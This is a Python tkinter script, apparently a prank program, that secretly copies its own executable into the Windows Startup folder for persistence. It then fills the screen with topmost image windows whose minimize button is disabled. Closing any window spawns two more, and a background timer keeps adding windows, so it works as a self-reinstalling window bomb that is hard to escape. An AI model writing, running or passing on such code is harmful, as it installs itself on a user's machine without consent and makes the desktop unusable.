import tkinter as tk
from tkinter import PhotoImage
import random
import os
import sys
import ctypes
import platform
import shutil
import threading

STARTUP_DIR = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
IMAGE_FILE = "fart.png"

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return relative_path

def disable_minimize(window):
    if platform.system() == "Windows":
        hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
        style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
        style &= ~0x20000
        ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)

def self_copy():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    dest_path = os.path.join(STARTUP_DIR, os.path.basename(exe_path))
    if not os.path.exists(dest_path):
        shutil.copy2(exe_path, dest_path)

root = tk.Tk()
root.withdraw()

image = PhotoImage(file=resource_path(IMAGE_FILE))
open_windows = []

def create_window():
    win = tk.Toplevel()
    win.title("pl8")
    win.attributes("-topmost", True)
    sw = win.winfo_screenwidth()
    sh = win.winfo_screenheight()
    x = random.randint(0, sw - 200)
    y = random.randint(0, sh - 200)
    win.geometry(f"+{x}+{y}")
    label = tk.Label(win, image=image)
    label.image = image
    label.pack()
    win.update_idletasks()
    disable_minimize(win)
    win.protocol("WM_DELETE_WINDOW", lambda w=win: on_close(w))
    open_windows.append(win)

def on_close(win):
    if win in open_windows:
        open_windows.remove(win)
    win.destroy()
    create_window()
    create_window()

def spawn_if_idle():
    if open_windows:
        create_window()
        create_window()

def spawn_timer():
    while True:
        root.after(10000, spawn_if_idle)
        root.after(10000, lambda: None)
        root.update()

self_copy()
create_window()
threading.Thread(target=spawn_timer, daemon=True).start()
root.mainloop()
